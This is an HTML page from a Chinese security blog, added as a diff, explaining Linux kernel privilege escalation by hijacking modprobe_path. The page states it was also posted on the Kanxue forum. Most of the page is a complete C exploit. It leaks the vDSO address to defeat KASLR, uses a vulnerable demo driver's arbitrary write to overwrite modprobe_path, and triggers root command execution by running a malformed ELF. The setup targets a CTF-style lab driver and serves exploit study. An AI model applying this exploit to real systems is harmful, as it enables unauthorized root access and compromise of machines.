@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(四) - povcfe&#39;s blog</title><meta name="Description" content="povcfe&#39;s blog"><meta property="og:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(四)" />
+<meta property="og:description" content="发表于看雪论坛
+hijack_modprobe_path篇   原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path &hellip;)
+  修改modprobe后，即可实现root权限任意命令执行
+  攻击流程
+ (内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令 写入错误格式elf文件，并手动执行，触发    一. 利用步骤 1. 定位modprobe_path(开启kaslr)   同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址
+  获得当前调试阶段modprobe_path与内核基地址固定偏移
+  modprobe_path_addr = 内核基地址&#43;固定偏移
+  2. 修改modprobe_path 为任意指令 二. 驱动代码(见cred) 三. exp #define _GNU_SOURCE  #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/auxv.h&gt;#include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002  size_t modprobe_path = 0xe3cba0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://povcfe.github.io/posts/kernel_rw4/" />
+<meta property="og:image" content="https://povcfe.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-02-02T10:32:55-08:00" />
+<meta property="article:modified_time" content="2020-02-02T10:32:55-08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://povcfe.github.io/logo.png"/>
+
+<meta name="twitter:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(四)"/>
+<meta name="twitter:description" content="发表于看雪论坛
+hijack_modprobe_path篇   原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path &hellip;)
+  修改modprobe后，即可实现root权限任意命令执行
+  攻击流程
+ (内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令 写入错误格式elf文件，并手动执行，触发    一. 利用步骤 1. 定位modprobe_path(开启kaslr)   同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址
+  获得当前调试阶段modprobe_path与内核基地址固定偏移
+  modprobe_path_addr = 内核基地址&#43;固定偏移
+  2. 修改modprobe_path 为任意指令 二. 驱动代码(见cred) 三. exp #define _GNU_SOURCE  #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/auxv.h&gt;#include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002  size_t modprobe_path = 0xe3cba0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL."/>
+<meta name="application-name" content="povcfe&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="povcfe&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://povcfe.github.io/posts/kernel_rw4/" /><link rel="prev" href="https://povcfe.github.io/posts/kernel_rw3/" /><link rel="next" href="https://povcfe.github.io/posts/kernel_boot/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "linux 内核提权总结(demo+exp分析) -- 任意读写(四)",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/povcfe.github.io\/posts\/kernel_rw4\/"
+        },"genre": "posts","keywords": "linux kernel, rw, exp","wordcount":  206 ,
+        "url": "https:\/\/povcfe.github.io\/posts\/kernel_rw4\/","datePublished": "2020-02-02T10:32:55-08:00","dateModified": "2020-02-02T10:32:55-08:00","publisher": {
+            "@type": "Organization",
+            "name": "作者"},"author": {
+                "@type": "Person",
+                "name": "作者"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="povcfe&#39;s blog">povcfe&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="povcfe&#39;s blog">povcfe&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">linux 内核提权总结(demo&#43;exp分析) -- 任意读写(四)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>作者</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/linux%E5%86%85%E6%A0%B8%E6%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="far fa-folder fa-fw"></i>linux内核态漏洞利用</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-02-02">2020-02-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 206 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 1 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#hijack_modprobe_path篇">hijack_modprobe_path篇</a>
+      <ul>
+        <li><a href="#一-利用步骤">一. 利用步骤</a></li>
+        <li><a href="#二-驱动代码见cred">二. 驱动代码(见cred)</a></li>
+        <li><a href="#三-exp">三. exp</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://bbs.pediy.com/user-839858.htm" target="_blank" rel="noopener noreffer">发表于看雪论坛</a></p>
+<h2 id="hijack_modprobe_path篇">hijack_modprobe_path篇</h2>
+<ul>
+<li>
+<p>原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path &hellip;)</p>
+</li>
+<li>
+<p>修改modprobe后，即可实现root权限任意命令执行</p>
+</li>
+<li>
+<p>攻击流程</p>
+<ul>
+<li>(内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令</li>
+<li>写入错误格式elf文件，并手动执行，触发</li>
+</ul>
+</li>
+</ul>
+<h3 id="一-利用步骤">一. 利用步骤</h3>
+<h4 id="1-定位modprobe_path开启kaslr">1. 定位modprobe_path(开启kaslr)</h4>
+<ul>
+<li>
+<p>同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址</p>
+</li>
+<li>
+<p>获得当前调试阶段modprobe_path与内核基地址固定偏移</p>
+</li>
+<li>
+<p>modprobe_path_addr = 内核基地址+固定偏移</p>
+</li>
+</ul>
+<h4 id="2-修改modprobe_path-为任意指令">2. 修改modprobe_path 为任意指令</h4>
+<h3 id="二-驱动代码见cred">二. 驱动代码(见cred)</h3>
+<h3 id="三-exp">三. exp</h3>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
+</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/auxv.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define CHANGE_POINT 0x100000
+</span><span class="cp">#define RW_READ 0x100001
+</span><span class="cp">#define RW_WRITE 0x100002
+</span><span class="cp"></span>
+<span class="n">size_t</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="mh">0xe3cba0</span><span class="p">;</span>
+<span class="n">size_t</span> <span class="n">vmlinux_base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">vunl</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">point</span><span class="p">;</span>
+    <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">VUNL</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">leak_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="mh">0xffffffff80000000</span><span class="p">;</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span> <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">VUNL</span><span class="p">.</span><span class="n">point</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">;</span>
+
+        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANGE_POINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">VUNL</span><span class="p">);</span> <span class="c1">//change the point
+</span><span class="c1"></span>        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RW_READ</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;gettimeofday&#34;</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x2b5</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of VDSO is: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
+            <span class="n">vmlinux_base</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffffff000000</span><span class="p">;</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of vmlinux base is: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">vmlinux_base</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] not found, try again!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/rw_any_dev&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="n">leak_data</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+    <span class="n">modprobe_path</span> <span class="o">+=</span> <span class="n">vmlinux_base</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of modprobe_path is: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">modprobe_path</span><span class="p">);</span>
+
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">point</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">modprobe_path</span><span class="p">;</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANGE_POINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">VUNL</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RW_WRITE</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;#!/bin/sh</span><span class="se">\n</span><span class="s">chmod 777 /flag&#39; &gt; /su.sh&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /su.sh&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff&#39; &gt; /dummy&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /dummy&#34;</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/dummy&#34;</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-02-02</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux-kernel/">linux kernel</a>,&nbsp;<a href="/tags/rw/">rw</a>,&nbsp;<a href="/tags/exp/">exp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/kernel_rw3/" class="prev" rel="prev" title="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三) "><i class="fas fa-angle-left fa-fw"></i>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三) </a>
+            <a href="/posts/kernel_boot/" class="next" rel="next" title="linux内核(5.4.81)---内核引导">linux内核(5.4.81)---内核引导<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
